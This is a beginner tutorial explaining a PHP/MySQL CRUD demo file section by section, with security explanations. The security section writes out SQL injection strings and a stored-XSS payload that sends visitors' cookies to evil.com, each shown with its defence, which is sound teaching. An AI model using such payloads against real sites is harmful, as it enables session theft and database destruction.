# PHP CRUD — Complete Learning Report
### File: `learning_crud.php`

**What this document is:** A deep explanation of every single line in `learning_crud.php` — a self-contained demo file that teaches PHP, HTML, CSS, JavaScript, and MySQL all in one place.

**Who this is for:** Anyone who wants to understand how a real web application works from the inside out.

**How to use this alongside the file:**
1. Open `learning_crud.php` in a code editor (VS Code, Notepad++, etc.)
2. Open this document beside it
3. Try every experiment in Section 10 — that is the fastest way to learn

---

## Contents

| # | Section |
|---|---------|
| 1 | [The Big Picture — How It All Connects](#1-the-big-picture--how-it-all-connects) |
| 2 | [File Map — What Lives Where](#2-file-map--what-lives-where) |
| 3 | [MySQL — The Database](#3-mysql--the-database) |
| 4 | [PHP — The Server Brain](#4-php--the-server-brain) |
| 5 | [HTML — The Page Structure](#5-html--the-page-structure) |
| 6 | [CSS — The Visual Style](#6-css--the-visual-style) |
| 7 | [JavaScript — The Browser Behaviour](#7-javascript--the-browser-behaviour) |
| 8 | [CRUD — The Full Journey](#8-crud--the-full-journey) |
| 9 | [Security — Why the Code is Written This Way](#9-security--why-the-code-is-written-this-way) |
| 10 | [Experiments — Change Things and See What Happens](#10-experiments--change-things-and-see-what-happens) |
| 11 | [Common Errors and Fixes](#11-common-errors-and-fixes) |
| 12 | [Glossary](#12-glossary) |

---

## 1. The Big Picture — How It All Connects

Most beginners think a website is just HTML. In reality a dynamic website is **five technologies working together**:

```
┌─────────────────────────────────────────────────────┐
│                   YOUR COMPUTER                     │
│                                                     │
│  ┌──────────┐   runs   ┌─────────────────────────┐  │
│  │  XAMPP   │ ───────▶ │  Apache Web Server      │  │
│  │          │          │  PHP Engine             │  │
│  │  (start  │          │  MySQL Database         │  │
│  │   this   │          └────────────┬────────────┘  │
│  │  first)  │                       │               │
│  └──────────┘                       │               │
│                                     │               │
└─────────────────────────────────────┼───────────────┘
                                      │ HTTP
                                      ▼
                            ┌─────────────────┐
                            │   YOUR BROWSER  │
                            │  (Chrome, etc.) │
                            │                 │
                            │  Renders HTML   │
                            │  Applies CSS    │
                            │  Runs JS        │
                            └─────────────────┘
```

**The flow when you visit the page:**

```
1. Browser  →  "Give me learning_crud.php"
2. Apache   →  passes the request to PHP
3. PHP      →  connects to MySQL, runs queries, builds HTML
4. PHP      →  sends finished HTML back to the browser
5. Browser  →  displays the HTML, applies CSS, runs JavaScript
```

**Key insight:** PHP runs on the server and is finished before the browser gets involved. JavaScript runs in the browser after PHP is done. They never run at the same time.

---

## 2. File Map — What Lives Where

```
learning_crud.php
│
├── [PHP ZONE — top of file, before <!DOCTYPE html>]
│   │
│   ├── STEP 1 — Connect to MySQL
│   │           new mysqli(host, user, password, database)
│   │
│   ├── STEP 2 — Create table if it does not exist
│   │           CREATE TABLE IF NOT EXISTS learning_names (...)
│   │
│   ├── STEP 3 — Declare working variables
│   │           $message, $editId, $editName
│   │
│   ├── STEP 4 — Handle POST (Insert / Update)
│   │           if ($_SERVER['REQUEST_METHOD'] === 'POST')
│   │           Reads $_POST['action'] to decide which one
│   │
│   ├── STEP 5 — Handle GET (Delete / Load Edit form)
│   │           if (isset($_GET['action']))
│   │           Reads $_GET['action'] and $_GET['id']
│   │
│   └── STEP 6 — Read all rows
│               SELECT * FROM learning_names ORDER BY id DESC
│               Stored in $result
│
├── [HTML HEAD]
│   └── [CSS ZONE — inside <style>...]</style>]
│       Every visual rule for the page lives here
│
└── [HTML BODY — the visible page]
    ├── Feedback message  (shown if $message is not empty)
    ├── Insert form       (shown when $editId is null)
    ├── Update form       (shown when $editId has a value)
    ├── Read table        (PHP while loop over $result)
    ├── Tech legend       (static HTML table)
    └── [JS ZONE — inside <script>...]</script>]
        Feature 1: delete confirmation dialog
        Feature 2: auto-hide feedback message
        Feature 3: highlight newly added row
```

---

## 3. MySQL — The Database

### What MySQL Is

MySQL is a **Relational Database Management System (RDBMS)**. Data is stored in **tables** — think of a table exactly like a spreadsheet:

```
learning_names table:
┌────┬──────────────┬─────────────────────┐
│ id │     name     │      created_at      │
├────┼──────────────┼─────────────────────┤
│  3 │ Nuwan Silva  │ 2025-04-10 10:31:00 │   ← newest (id=3)
│  2 │ Ashan Perera │ 2025-04-10 10:30:30 │
│  1 │ Kasun Perera │ 2025-04-10 10:30:00 │   ← oldest (id=1)
└────┴──────────────┴─────────────────────┘
```

Each **row** is one record. Each **column** is one field.

### The Table Definition Explained Line by Line

```sql
CREATE TABLE IF NOT EXISTS learning_names (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    name       VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

| Part | Meaning |
|------|---------|
| `CREATE TABLE` | SQL command to make a new table |
| `IF NOT EXISTS` | Only create it if it does not already exist — so visiting the page 100 times does not error |
| `learning_names` | The name we chose for this table |
| `id INT` | Column named "id", data type INT (whole number) |
| `AUTO_INCREMENT` | MySQL automatically assigns 1, 2, 3 … to each new row |
| `PRIMARY KEY` | This column uniquely identifies each row — no duplicates allowed |
| `name VARCHAR(100)` | Column named "name", text up to 100 characters |
| `NOT NULL` | This column must have a value — cannot be left empty |
| `created_at TIMESTAMP` | Column named "created_at", stores date + time |
| `DEFAULT CURRENT_TIMESTAMP` | MySQL fills this in automatically when a row is inserted |

### The Four SQL Commands (CRUD)

#### C — INSERT (Create a new row)
```sql
INSERT INTO learning_names (name) VALUES ('Kasun')
```
- We only provide `name`.
- MySQL automatically fills in `id` (next number) and `created_at` (current time).
- After this, a new row appears in the table.

#### R — SELECT (Read / fetch rows)
```sql
SELECT * FROM learning_names ORDER BY id DESC
```
- `SELECT *` means "give me every column".
- `FROM learning_names` says which table.
- `ORDER BY id DESC` sorts results: highest `id` first (newest row at the top).
- Change `DESC` to `ASC` and the oldest row comes first.

#### U — UPDATE (Change an existing row)
```sql
UPDATE learning_names SET name = 'Nuwan' WHERE id = 2
```
- `SET name = 'Nuwan'` changes the name column.
- `WHERE id = 2` limits the change to **only** the row with id 2.
- **Without `WHERE`, every single row gets updated.** Always use `WHERE` with UPDATE.

#### D — DELETE (Remove a row)
```sql
DELETE FROM learning_names WHERE id = 2
```
- Permanently removes the row where id = 2.
- **Without `WHERE`, every row in the table is deleted.** Always use `WHERE` with DELETE.

---

## 4. PHP — The Server Brain

### What PHP Is

PHP is a **server-side scripting language**. "Server-side" means it runs on the web server (your computer via XAMPP), not in the browser. By the time the browser receives the page, all PHP has already finished running.

```
You write this:           Browser receives this:
──────────────            ──────────────────────
<?php                     <p>Hello Kasun</p>
  $name = 'Kasun';
  echo "<p>Hello $name</p>";
?>
```

The browser never sees `<?php ... ?>`. PHP converts it to HTML first.

### STEP 1 — Database Connection

```php
$conn = new mysqli('127.0.0.1', 'root', '', 'cricket_academy');
```

| Argument | Value | Meaning |
|----------|-------|---------|
| host | `'127.0.0.1'` | Where MySQL is. `127.0.0.1` = "this same computer" |
| user | `'root'` | MySQL username (XAMPP default) |
| password | `''` | Empty password (XAMPP default) |
| database | `'cricket_academy'` | Which database to open |

`new mysqli(...)` creates a **connection object** stored in `$conn`. We then call methods on it like `$conn->query(...)` and `$conn->prepare(...)`.

### STEP 2 — Create Table

```php
$conn->query("CREATE TABLE IF NOT EXISTS learning_names ( ... )");
```

`$conn->query(sql)` sends any SQL to MySQL and runs it. Used here for the CREATE TABLE because it does not involve user input (no security risk). For INSERT/UPDATE/DELETE we use prepared statements instead (see Step 4).

### STEP 3 — Working Variables

```php
$message  = '';    // success / error text shown to the user
$editId   = null;  // id of the row currently being edited (null = none)
$editName = '';    // current name of the row being edited
```

These are set to safe default values. If no action happened this visit they stay as `''` and `null` and the page just shows the table.

### STEP 4 — Handling POST (Insert & Update)

#### How PHP knows a form was submitted

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') { ... }
```

`$_SERVER` is a PHP **superglobal** — an array automatically filled by PHP with information about the current request. `REQUEST_METHOD` is `'GET'` when someone just opens a URL, and `'POST'` when a `<form method="POST">` was submitted.

#### Reading form values

When a form is submitted, PHP puts all the input values into `$_POST`:

```html
<!-- The HTML form -->
<input type="hidden" name="action" value="insert">
<input type="text"   name="name"   value="Kasun">
```
```php
// What PHP receives
$_POST['action'] === 'insert'
$_POST['name']   === 'Kasun'
```

The `name` attribute in HTML becomes the key in `$_POST`.

#### Prepared Statements — The Safe Way to Run SQL

**Unsafe (never do this):**
```php
$conn->query("INSERT INTO learning_names (name) VALUES ('$name')");
// If $name = "'; DROP TABLE learning_names; --"
// The SQL becomes: INSERT INTO learning_names (name) VALUES (''; DROP TABLE learning_names; --')
// MySQL would execute the DROP TABLE and destroy all data.
```

**Safe (prepared statement):**
```php
$stmt = $conn->prepare("INSERT INTO learning_names (name) VALUES (?)");
$stmt->bind_param("s", $name);
$stmt->execute();
$stmt->close();
```

| Line | What it does |
|------|-------------|
| `prepare(sql)` | Sends the SQL *template* to MySQL. The `?` is a placeholder — not filled in yet. MySQL analyses the query structure here. |
| `bind_param("s", $name)` | Fills in the `?` with `$name`. `"s"` means String. MySQL treats this value as **data only**, never as SQL code. |
| `execute()` | Runs the query with the bound value. |
| `close()` | Releases memory. |

For the UPDATE with two placeholders:
```php
$stmt = $conn->prepare("UPDATE learning_names SET name = ? WHERE id = ?");
$stmt->bind_param("si", $name, $id);
//                  ↑↑
//           s = String ($name)
//           i = Integer ($id)
// The letters must match the order of the ? marks.
```

### STEP 5 — Handling GET (Delete & Load Edit)

GET actions come from clicking links. The action and id travel in the **URL**:

```
?action=delete&id=3   →   $_GET['action'] = 'delete',  $_GET['id'] = '3'
?action=edit&id=3     →   $_GET['action'] = 'edit',    $_GET['id'] = '3'
```

**Type casting for safety:**
```php
$id = (int) $_GET['id'];
```
`(int)` forces the value to be an integer. If someone manually types `?id=1;DROP TABLE` in the URL it becomes just `1`. This is called **type casting** and is one of the simplest security measures.

### STEP 6 — Read All Rows

```php
$result = $conn->query("SELECT * FROM learning_names ORDER BY id DESC");
```

`$result` is a **result-set object**. It does not contain the actual rows yet — think of it as a pointer to the data. You call `$result->fetch_assoc()` repeatedly to get one row at a time.

```php
$result->num_rows   // how many rows were returned (0 if table is empty)
$result->fetch_assoc()  // returns the next row as ['id'=>1, 'name'=>'Kasun', ...]
                        // returns null when all rows have been fetched
```

### PHP Inside HTML

Once `?>` is reached, PHP "closes" and everything is sent to the browser as-is. You can re-open PHP anywhere with `<?php` or use the short echo tag `<?=`:

```php
<h2>Editing row <?= $editId ?></h2>
// is identical to:
<h2>Editing row <?php echo $editId; ?></h2>
```

The alternative `if`/`while` syntax (using `:` and `endif`/`endwhile`) is used inside HTML to make the code more readable than nested `{}`:

```php
<?php if ($condition): ?>
    <p>This HTML is only output if $condition is true.</p>
<?php endif; ?>

<?php while ($row = $result->fetch_assoc()): ?>
    <tr><td><?= $row['name'] ?></td></tr>
<?php endwhile; ?>
```

---

## 5. HTML — The Page Structure

### What HTML Is

HTML (HyperText Markup Language) is the **skeleton** of a web page. It uses **tags** (words inside `< >`) to describe each piece of content:

```
<tag attribute="value">content</tag>
```

The browser reads HTML top to bottom and builds a visual representation.

### The DOCTYPE and `<html>`

```html
<!DOCTYPE html>
<html lang="en">
```

- `<!DOCTYPE html>` tells the browser "this is modern HTML5". Without it browsers go into quirks mode (old broken rendering).
- `lang="en"` helps screen readers and search engines know the language.

### `<head>` vs `<body>`

```html
<head>
  <!-- Settings, CSS, title — NOT visible on screen -->
</head>
<body>
  <!-- Everything visible to the user goes here -->
</body>
```

### `<meta>` Tags

```html
<meta charset="UTF-8">
```
Tells the browser how to decode text characters. Without this, characters like ✅ 🗑️ may display as garbled symbols.

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```
Makes the page scale correctly on mobile phones. Without this, mobile browsers zoom out and show tiny text.

### Forms — How Data is Sent to PHP

A form groups inputs and sends their values to the server when submitted:

```html
<form method="POST" action="">
    <input type="hidden" name="action" value="insert">
    <input type="text"   name="name"   placeholder="Type a name" required>
    <button type="submit">Add Name</button>
</form>
```

| Attribute | Meaning |
|-----------|---------|
| `method="POST"` | Data goes in the request **body** — not visible in the URL |
| `method="GET"` | Data goes in the URL as `?key=value` — visible to the user |
| `action=""` | Where to submit. Empty = same page (this file handles itself) |
| `name="name"` | The key PHP uses to read the value: `$_POST['name']` |
| `type="hidden"` | Invisible field — used to pass the action type to PHP |
| `required` | Browser enforces this — will not submit if empty |
| `placeholder` | Grey hint text shown inside an empty input |

### The `<table>` Element

```html
<table>
    <thead>                          <!-- header section -->
        <tr>                         <!-- one table row -->
            <th>ID</th>              <!-- header cell (bold) -->
            <th>Name</th>
        </tr>
    </thead>
    <tbody>                          <!-- data section -->
        <tr>
            <td>1</td>               <!-- data cell -->
            <td>Kasun</td>
        </tr>
    </tbody>
</table>
```

The browser draws this as a grid. CSS controls the colours and spacing.

### Links vs Buttons

```html
<!-- A link — navigates to a URL on click -->
<a href="?action=delete&id=5">Delete</a>

<!-- A button — submits the form it lives inside -->
<button type="submit">Save</button>
```

The Delete and Edit actions use `<a>` links (GET request via URL). The Insert and Update actions use `<button type="submit">` inside a form (POST request with body data).

### `htmlspecialchars()` in HTML Output

Whenever PHP outputs user-supplied data into HTML, it must be escaped:

```php
<?= htmlspecialchars($row['name']) ?>
```

| Character | Without escaping | With htmlspecialchars |
|-----------|-----------------|----------------------|
| `<` | Starts an HTML tag | `&lt;` — shown as text |
| `>` | Ends an HTML tag | `&gt;` — shown as text |
| `"` | Breaks an HTML attribute | `&quot;` |
| `'` | Breaks a JS string | `&#039;` (with ENT_QUOTES) |
| `&` | Starts an HTML entity | `&amp;` |

Without this, a name like `<script>alert('x')</script>` would execute as JavaScript in every visitor's browser (XSS attack).

---

## 6. CSS — The Visual Style

### What CSS Is

CSS (Cascading Style Sheets) controls **how** HTML elements look. It does not change what is on the page — only how it appears.

Every CSS rule follows this pattern:

```css
selector {
    property: value;
    property: value;
}
```

### The "Cascading" Part

Multiple CSS rules can target the same element. They are applied in order (cascade), and more **specific** rules win:

```css
button       { color: black; }   /* less specific */
.btn-primary { color: white; }   /* more specific — wins for .btn-primary elements */
```

### Selectors Used in This File

| Selector | Example in file | What it targets |
|----------|-----------------|-----------------|
| Universal | `* { box-sizing: border-box; }` | Every single element |
| Tag | `body { }`, `table { }` | All elements of that HTML tag |
| Class | `.card { }`, `.btn { }` | All elements with that class name |
| Attribute | `input[type="text"] { }` | Inputs with a specific type |
| Pseudo-class | `tr:hover { }` | An element in a specific state |
| Compound | `tbody tr:nth-child(even) { }` | Even rows inside a tbody |

### The Box Model — Every Element is a Box

```
┌─────────────────────────────────────┐
│               MARGIN                │  ← space OUTSIDE the element
│   ┌─────────────────────────────┐   │
│   │           BORDER            │   │  ← the visible edge line
│   │   ┌─────────────────────┐   │   │
│   │   │       PADDING       │   │   │  ← space between border and content
│   │   │   ┌─────────────┐   │   │   │
│   │   │   │   CONTENT   │   │   │   │  ← text, image, etc.
│   │   │   └─────────────┘   │   │   │
│   │   └─────────────────────┘   │   │
│   └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

```css
.card {
    padding: 25px 30px;               /* inner spacing */
    border-radius: 10px;              /* rounded corners */
    box-shadow: 0 2px 10px rgba(0,0,0,0.08);  /* drop shadow */
    margin-bottom: 25px;              /* gap below the card */
}
```

`box-sizing: border-box` (set globally on `*`) means `width` includes padding and border — the most predictable behaviour for layouts.

### Colours

CSS accepts colours in several formats:

| Format | Example | Use |
|--------|---------|-----|
| Named | `red`, `white`, `black` | Simple, human-readable |
| Hex | `#1a73e8` | Precise — #RRGGBB in hexadecimal |
| RGB | `rgb(26, 115, 232)` | Same as hex but decimal |
| RGBA | `rgba(0, 0, 0, 0.08)` | RGB + Alpha (opacity 0–1) |

### Transitions

```css
.btn { transition: background 0.2s; }
```

When the `background` property changes (e.g. on hover), instead of snapping instantly the browser animates the change over `0.2s`. Multiple properties can be listed:

```css
transition: background 0.2s, transform 0.1s;
```

### Flexbox

```css
.actions { display: flex; gap: 6px; }
```

`display: flex` turns the element into a **flex container**. Its direct children (the Edit and Delete buttons) are placed in a row automatically. `gap` adds space between them.

---

## 7. JavaScript — The Browser Behaviour

### What JavaScript Is

JavaScript (JS) is the only programming language that runs **natively in the browser**. While PHP handles server logic and database work, JavaScript handles everything that happens after the page loads — without needing to talk to the server at all.

```
PHP  →  runs on server  →  produces HTML
JS   →  runs in browser →  modifies the page in real time
```

### The DOM — Document Object Model

When the browser receives HTML it builds a tree of objects called the **DOM**. Every HTML element becomes a node in this tree. JavaScript can find, read, and change any node.

```
DOM tree:
document
└── html
    ├── head
    └── body
        └── div.container
            ├── h1                    ← document.querySelector('h1')
            ├── div.message#msg       ← document.getElementById('msg')
            └── div.card
                └── table
                    └── tbody
                        └── tr        ← document.querySelector('tbody tr')
```

### Feature 1 — Delete Confirmation

```javascript
function confirmDelete(id, name) {
    return confirm('Are you sure you want to delete "' + name + '"?');
}
```

This function is defined but not called yet. It gets called by `onclick` in the HTML:

```html
<a href="?action=delete&id=5"
   onclick="return confirmDelete(5, 'Kasun')">
   Delete
</a>
```

**Flow:**
1. User clicks Delete
2. Browser calls `confirmDelete(5, 'Kasun')` before following the link
3. `confirm()` shows a native browser dialog: "Are you sure…?" with OK and Cancel
4. User clicks **OK** → `confirm()` returns `true` → `confirmDelete` returns `true` → `onclick` returns `true` → the link is followed → PHP deletes the row
5. User clicks **Cancel** → `confirm()` returns `false` → `onclick` returns `false` → **the link is cancelled** → nothing is deleted

### Feature 2 — Auto-hide Message

```javascript
const msg = document.getElementById('msg');

if (msg) {
    setTimeout(function () {
        msg.style.transition = 'opacity 0.8s';
        msg.style.opacity    = '0';
        setTimeout(() => msg.remove(), 800);
    }, 4000);
}
```

Step by step:

| Line | What it does |
|------|-------------|
| `document.getElementById('msg')` | Finds the `<div id="msg">` in the DOM. Returns `null` if no message was output by PHP. |
| `if (msg)` | Only run this if the message element actually exists on the page |
| `setTimeout(fn, 4000)` | Wait 4000 milliseconds (4 seconds), then run the function |
| `msg.style.transition = 'opacity 0.8s'` | Tell the browser: animate any opacity change over 0.8 seconds |
| `msg.style.opacity = '0'` | Change opacity to 0 — triggers the fade animation |
| `setTimeout(() => msg.remove(), 800)` | After 800ms (when the fade finishes), remove the element from the DOM entirely |

**Arrow function** `() => msg.remove()` is shorthand for `function() { msg.remove(); }`. They are equivalent.

### Feature 3 — Highlight New Row

```javascript
if (msg && msg.textContent.includes('added')) {
    const firstRow = document.querySelector('tbody tr');
    if (firstRow) {
        firstRow.style.background = '#fff9c4';
        firstRow.style.transition = 'background 2s';
        setTimeout(() => firstRow.style.background = '', 2000);
    }
}
```

| Line | What it does |
|------|-------------|
| `msg.textContent` | The plain text inside the message div (no HTML tags) |
| `.includes('added')` | Returns `true` if the string contains the word "added" |
| `document.querySelector('tbody tr')` | Finds the first `<tr>` inside `<tbody>` — the newest row (because SELECT is DESC) |
| `firstRow.style.background = '#fff9c4'` | Sets a yellow background on that row |
| `firstRow.style.transition = 'background 2s'` | Any background change will now animate over 2 seconds |
| `firstRow.style.background = ''` | Setting to empty string removes the inline style, so the CSS rule takes over again — causing the yellow to fade away |

### `const` vs `let` vs `var`

| Keyword | Can be reassigned? | Scope | Notes |
|---------|-------------------|-------|-------|
| `const` | No | Block `{}` | Use by default — signals "this will not change" |
| `let` | Yes | Block `{}` | Use when you need to reassign |
| `var` | Yes | Function | Old style — avoid in modern code |

---

## 8. CRUD — The Full Journey

Here is a complete trace for each operation:

### INSERT — Adding a Name

```
1. User types "Kasun" and clicks Add Name

2. Browser builds POST request:
   POST /Elite/learning_crud.php
   Body: action=insert&name=Kasun

3. PHP receives request:
   $_SERVER['REQUEST_METHOD'] === 'POST'  ✓
   $_POST['action'] === 'insert'          ✓
   $_POST['name']   === 'Kasun'

4. PHP: $name = trim('Kasun') = 'Kasun'  (not empty)

5. MySQL: INSERT INTO learning_names (name) VALUES ('Kasun')
   → New row created with id=1, created_at=now()

6. PHP: $message = '✅ Name "Kasun" added!'

7. PHP: SELECT * FROM learning_names ORDER BY id DESC
   → Returns 1 row

8. PHP builds HTML:
   - Outputs green message div
   - Outputs Insert form (editId is null)
   - Outputs table with 1 row

9. Browser renders page
   - JS finds #msg, schedules fade after 4 seconds
   - JS highlights the first table row yellow
```

### READ — Viewing All Names

```
1. User visits the page (no form submitted, no URL params)

2. Browser builds GET request:
   GET /Elite/learning_crud.php

3. PHP:
   - No POST → skip insert/update
   - No GET action → skip delete/edit
   - SELECT * FROM learning_names ORDER BY id DESC
   - $result has all rows

4. PHP builds HTML with table showing all rows

5. Browser renders the table
```

### UPDATE — Editing a Name

```
Step A — Load the edit form:
1. User clicks Edit on row id=2
2. Browser navigates to: ?action=edit&id=2
3. PHP: $_GET['action'] === 'edit', $id = 2
4. PHP: SELECT * WHERE id = 2 → $editId=2, $editName='Ashan'
5. PHP builds HTML:
   - Shows Update form (pre-filled with "Ashan")
   - Hides Insert form

Step B — Submit the edit:
1. User changes "Ashan" to "Nuwan" and clicks Save Changes
2. Browser builds POST request:
   Body: action=update&id=2&name=Nuwan
3. PHP: $_POST['action'] === 'update'
4. MySQL: UPDATE learning_names SET name='Nuwan' WHERE id=2
5. Page reloads showing "✅ Name updated to Nuwan!"
```

### DELETE — Removing a Name

```
1. User clicks Delete on row id=2
2. JS calls confirmDelete(2, 'Nuwan')
3. confirm() dialog appears
4a. User clicks Cancel → link cancelled → nothing happens
4b. User clicks OK → browser navigates to ?action=delete&id=2
5. PHP: $id = (int)'2' = 2
6. MySQL: DELETE FROM learning_names WHERE id=2
7. Row removed. Page reloads with "🗑️ Name deleted."
```

---

## 9. Security — Why the Code is Written This Way

### Threat 1: SQL Injection

**What it is:** An attacker puts SQL code into an input field to manipulate the database query.

**Example attack:** If you built the SQL like this:
```php
$name = $_POST['name'];  // user inputs:  ' OR '1'='1
$conn->query("SELECT * FROM users WHERE name = '$name'");
// Becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
// '1'='1' is always true → returns ALL users → attacker sees everything
```

**How this file prevents it:** Prepared statements keep the SQL template and the data completely separate. MySQL receives the structure first, then the data — it can never confuse data for SQL code.

```php
$stmt = $conn->prepare("INSERT INTO learning_names (name) VALUES (?)");
$stmt->bind_param("s", $name);  // $name is treated as data only
$stmt->execute();
```

### Threat 2: XSS (Cross-Site Scripting)

**What it is:** An attacker stores JavaScript code as data, which then executes in other users' browsers.

**Example attack:** Attacker inserts the name:
```
<script>document.location='http://evil.com?c='+document.cookie</script>
```
Every visitor who views the table would have their cookies stolen.

**How this file prevents it:** `htmlspecialchars()` converts dangerous characters to HTML entities before displaying them:

```php
echo htmlspecialchars('<script>alert("x")</script>');
// Outputs: &lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;
// Browser shows it as text, never executes it
```

### Threat 3: Unexpected Input Types

**What it is:** An attacker passes something unexpected as an `id` value.

**Example:** `?id=1; DROP TABLE learning_names; --`

**How this file prevents it:**
```php
$id = (int) $_GET['id'];
// '1; DROP TABLE...' becomes the integer 1
// The SQL injection is neutralised before it reaches MySQL
```

### Summary Table

| Threat | Attack Vector | Defence Used |
|--------|--------------|--------------|
| SQL Injection | INSERT/UPDATE/DELETE with user data | Prepared statements (`bind_param`) |
| XSS | Displaying stored user input | `htmlspecialchars()` on all output |
| Type confusion | `id` parameter in URL | `(int)` type cast |

---

## 10. Experiments — Change Things and See What Happens

These are all safe — try them! Nothing will break permanently (just refresh or undo).

### CSS Experiments (inside `<style>`)

| Change | Find this | Replace with | What you will see |
|--------|-----------|--------------|-------------------|
| Page background | `background: #f0f4f8` | `background: #1a1a2e` | Dark navy page |
| Title colour | `color: #1a73e8` (in h1) | `color: #e91e63` | Pink title |
| Card background | `background: #ffffff` | `background: #fffde7` | Yellow cards |
| Table header | `background: #1a73e8` (in thead th) | `background: #2e7d32` | Green header |
| Add button | `background: #1a73e8` (in .btn-primary) | `background: #6200ea` | Purple button |
| Delete button | `background: #ea4335` | `background: #ff6f00` | Orange delete button |
| Rounded cards | `border-radius: 10px` | `border-radius: 0` | Sharp rectangular cards |
| Font | `font-family: 'Segoe UI'...` | `font-family: monospace` | Terminal-style text |
| Hover row | `background: #e8f0fe` (in tr:hover) | `background: #fce4ec` | Pink hover |
| Button press | `transform: scale(0.97)` | `transform: scale(0.9)` | Buttons squish more on click |

### PHP Experiments (inside `<?php ?>`)

| Change | Find this | Replace with | What you will see |
|--------|-----------|--------------|-------------------|
| Sort order | `ORDER BY id DESC` | `ORDER BY id ASC` | Oldest name at the top |
| Sort by name | `ORDER BY id DESC` | `ORDER BY name ASC` | Names sorted A–Z |
| Page title | `PHP CRUD Demo` (in `<h1>`) | `My Name List` | Title changes |

### JavaScript Experiments (inside `<script>`)

| Change | Find this | Replace with | What you will see |
|--------|-----------|--------------|-------------------|
| Message delay | `}, 4000);` | `}, 1000);` | Message disappears in 1 second |
| Message delay | `}, 4000);` | `}, 10000);` | Message stays for 10 seconds |
| Fade speed | `'opacity 0.8s'` | `'opacity 3s'` | Very slow fade |
| Confirm text | `'Are you sure...'` | `'Deleting forever! Continue?'` | Different dialog text |
| Highlight colour | `'#fff9c4'` | `'#f8bbd0'` | Pink highlight on new row |
| Highlight fade | `'background 2s'` | `'background 5s'` | Highlight fades very slowly |

### Safe Structural Experiments

| Experiment | What to do | What you learn |
|------------|-----------|----------------|
| Remove `required` from the input | Delete the word `required` | Form submits with empty field — PHP validation catches it |
| Comment out `htmlspecialchars` | Change `htmlspecialchars($row['name'])` to just `$row['name']` then add a name with `<b>` in it | The `<b>` renders as bold — shows why escaping matters |
| Change `ORDER BY id DESC` to `ORDER BY name ASC` | PHP zone, STEP 6 | Names appear alphabetically |
| Remove `WHERE id = ?` from DELETE | — | **Warning: deletes all rows** — do this only with test data |

---

## 11. Common Errors and Fixes

### "Connection failed: Access denied"
**Cause:** Wrong username or password.
**Fix:** In XAMPP, the default username is `root` and the password is empty `''`. Check `$user` and `$pass` at the top of the file.

### "Connection failed: Unknown database 'cricket_academy'"
**Cause:** The database does not exist yet.
**Fix:** Open phpMyAdmin (http://localhost/phpmyadmin), create a database named `cricket_academy`.

### Page shows raw PHP code (`<?php $conn = ...`)
**Cause:** XAMPP is not running, or the file is being opened directly (double-clicking it) instead of through the web server.
**Fix:** Start XAMPP → Start Apache and MySQL → visit `http://localhost/Elite/learning_crud.php` in your browser.

### "No names yet" even after adding names
**Cause:** The form might be submitting to a different URL, or the database name is wrong.
**Fix:** Check that the `action=""` attribute in the form is empty (not a different file name).

### Special characters look broken (â€™ instead of ')
**Cause:** Missing or wrong `charset` in the HTML.
**Fix:** The `<meta charset="UTF-8">` tag must be inside `<head>` (it is already there in this file).

### Delete works but the row comes back on refresh
**Cause:** Browser is re-sending the last GET request from cache.
**Fix:** This is normal browser behaviour. Press Cmd+Shift+R (Mac) or Ctrl+Shift+R (Windows) for a hard refresh.

---

## 12. Glossary

| Term | Plain English Definition |
|------|--------------------------|
| **PHP** | A server-side programming language. Runs on the web server before the browser receives anything. |
| **MySQL** | A database system. Stores data in tables (like spreadsheets with fixed columns). |
| **SQL** | Structured Query Language — the commands used to talk to MySQL: SELECT, INSERT, UPDATE, DELETE. |
| **HTML** | HyperText Markup Language — defines the structure and content of a web page using tags. |
| **CSS** | Cascading Style Sheets — controls the visual appearance: colours, fonts, layout. |
| **JavaScript** | A programming language that runs in the browser, manipulating the page after it loads. |
| **XAMPP** | A free tool that runs Apache (web server), PHP, and MySQL on your local computer. |
| **Apache** | The web server software inside XAMPP. Receives browser requests and routes them to PHP. |
| **CRUD** | Create, Read, Update, Delete — the four fundamental database operations. |
| **GET request** | A browser request where data is passed in the URL (`?key=value`). Used for links. |
| **POST request** | A browser request where data is hidden in the request body. Used for forms. |
| **`$_POST`** | PHP superglobal array — automatically filled with form data when a POST request arrives. |
| **`$_GET`** | PHP superglobal array — automatically filled with URL parameters like `?action=delete&id=2`. |
| **`$_SERVER`** | PHP superglobal array — contains server information like `REQUEST_METHOD`. |
| **Prepared statement** | A secure way to run SQL: send the template first, bind data separately. Prevents SQL injection. |
| **`bind_param`** | PHP function that fills placeholders (`?`) in a prepared statement with actual values. |
| **`htmlspecialchars()`** | PHP function that converts `< > & " '` to HTML entities, preventing XSS attacks. |
| **SQL Injection** | An attack where an attacker puts SQL code into an input field to manipulate the database. |
| **XSS** | Cross-Site Scripting — an attack where a stored script tag executes in another user's browser. |
| **Type casting** | Forcing a variable to be a specific type, e.g. `(int)$_GET['id']` makes it a safe integer. |
| **DOM** | Document Object Model — the browser's tree of all HTML elements, which JavaScript can modify. |
| **`document.getElementById`** | JavaScript function that finds an element by its `id` attribute. |
| **`document.querySelector`** | JavaScript function that finds the first element matching a CSS selector. |
| **`setTimeout`** | JavaScript function that runs a function once after a specified delay (in milliseconds). |
| **Arrow function** | JavaScript shorthand: `() => expr` instead of `function() { return expr; }` |
| **`confirm()`** | JavaScript built-in that shows a browser dialog with OK / Cancel. Returns `true` or `false`. |
| **Superglobal** | A PHP variable (`$_POST`, `$_GET`, `$_SERVER`) automatically available everywhere in the script. |
| **`VARCHAR`** | MySQL column type for variable-length text. `VARCHAR(100)` = up to 100 characters. |
| **`AUTO_INCREMENT`** | MySQL feature that automatically assigns an increasing number (1, 2, 3…) to a column. |
| **`PRIMARY KEY`** | A column that uniquely identifies each row — no two rows can have the same value. |
| **`TIMESTAMP`** | MySQL column type that stores a date and time. |
| **`fetch_assoc()`** | PHP MySQLi method that returns one row from a result set as a key→value array. |
| **Box model** | CSS concept: every element is a box with content, padding, border, and margin layers. |
| **`box-sizing: border-box`** | CSS setting that makes `width` include padding and border — prevents layout surprises. |
| **Flexbox** | CSS layout system. `display: flex` places children side by side in a row. |
| **Transition** | CSS feature that animates property changes smoothly instead of snapping instantly. |
